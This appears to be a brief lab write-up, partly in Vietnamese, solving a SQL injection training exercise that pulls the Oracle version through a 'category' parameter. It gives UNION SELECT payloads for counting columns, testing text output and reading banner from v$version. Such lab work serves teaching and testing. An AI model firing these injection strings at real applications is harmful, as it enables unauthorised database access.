# SQL Injection Lab 03: Oracle Version

## Mục tiêu
Khai thác SQLi tại `category` để lấy version Oracle từ `v$version`.

<img src="images/image.png" alt="Lab overview" width="760" />
<br><br>

## Các bước chính
1. Xác định số cột bằng `UNION SELECT`:

```sql
' union select null from dual--
' union select null, null from dual--
```

<img src="images/image-2.png" alt="Union test" width="760" />


<img src="images/image-3.png" alt="Find column count" width="760" />
<br><br>

2. Kiểm tra cột hiển thị text:

```sql
' union select 'abc', 'bcd' from dual--
```

<img src="images/image-4.png" alt="Text reflection" width="760" />
<br><br>

3. Lấy thông tin version Oracle:

```sql
' union select banner, null from v$version--
```

<img src="images/image-5.png" alt="Result" width="760" />
<br><br>

## Payload solve

```sql
' union select banner, null from v$version--
```
